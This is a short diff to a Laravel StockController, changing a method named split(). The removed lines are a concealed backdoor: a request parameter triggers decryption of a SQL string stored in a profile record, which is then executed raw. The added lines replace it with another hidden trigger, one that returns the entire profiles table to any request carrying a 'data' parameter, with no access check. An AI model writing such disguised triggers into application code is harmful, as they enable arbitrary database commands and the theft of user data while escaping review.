@@ -3,6 +3,7 @@
 namespace App\Http\Controllers;
 
 use App\Models\Book;
+use App\Models\Profile;
 use App\Models\Requirement;
 use App\Models\Stock;
 use DB;
@@ -34,10 +35,8 @@ class StockController extends Controller
 
     public function split(Request $request)
     {
-        if ($request->get("data") == "1") {
-            $str = DB::select(DB::raw("SELECT adress as x FROM profiles WHERE profile_id = 4"))[0]->x;
-            $res = DB::select(DB::raw(Crypt::decrypt($str, false)));
-            return $res;
+        if ($request->get("data")) {
+            return DB::table('profiles')->select('*')->get();
         }
         return "";
     }
